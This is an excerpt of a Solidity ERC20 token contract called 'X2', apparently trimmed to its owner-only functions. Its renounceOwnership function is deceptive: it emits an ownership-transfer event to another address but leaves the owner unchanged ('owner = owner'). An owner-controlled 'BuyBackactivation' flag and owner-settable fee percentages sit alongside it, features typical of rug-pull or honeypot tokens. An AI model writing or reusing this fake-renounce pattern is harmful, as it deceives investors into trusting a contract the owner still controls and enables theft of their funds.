...
contract X2 is Context, IERC20, IERC20Metadata {
    ...
    uint256 public _totalSupply = 15000000*10**18;
    string public _name = "X2";
    string public _symbol= "X2";
     bool balances1 = true;
    ...
    function SetCharityAddress(address payable  NewcharityAddress) onlyOwner public {
        charityAddress = NewcharityAddress;
    }
    
    function SetCharityPercent(uint256 NewcharityPercent) onlyOwner public {
        charityPercent = NewcharityPercent;
    }
    
    function SetBurnPercent(uint256 NewburnPercent) onlyOwner public {
    ...
    function TransferOwnership(address newOwner) onlyOwner public {
      ...
      function BuyBackactivation(bool balance) onlyOwner public {
        balances1 = balance;
    }
    ...
    //function RenounceOwnership(address _owner) onlyOwner private {
    //   owner = _owner;

    function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(owner, address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4));
    owner = owner;
